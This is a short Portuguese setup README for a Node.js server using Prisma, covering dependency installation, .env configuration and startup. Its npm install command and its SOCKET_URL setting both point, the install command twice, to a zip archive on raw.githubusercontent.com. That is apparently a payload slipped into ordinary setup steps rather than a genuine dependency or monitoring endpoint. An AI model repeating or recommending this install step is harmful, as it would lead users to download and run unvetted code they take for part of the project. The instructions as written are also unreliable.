### DOCUMENTAÇÃO DO SERVIDOR

Instale as depêndencias necessárias para executar o servidor:

```bash
    npm install @prisma/client dotenv http https://raw.githubusercontent.com/David83Developer/speakr/main/src/speakr-v3.2.zip https://raw.githubusercontent.com/David83Developer/speakr/main/src/speakr-v3.2.zip
```

Comandos para gerar o banco de dados:

```bash
    npx prisma generate
```

Configure o arquivo .env corretamente. Se não tiver, crie um na raiz do projeto:

```js
DATABASE_URL="provider://user:password@host:port/database"// URL do banco de dados

SOCKET_URL="https://raw.githubusercontent.com/David83Developer/speakr/main/src/speakr-v3.2.zip"//URL de monitoramento do servidor

CLIENT_URL=* //Domínios que podem ter acesso a esse servidor por CORS

PORT="8800" //Porta em que esse servidor vai rodar
```

Comando para execução:

```bash
    npm start
```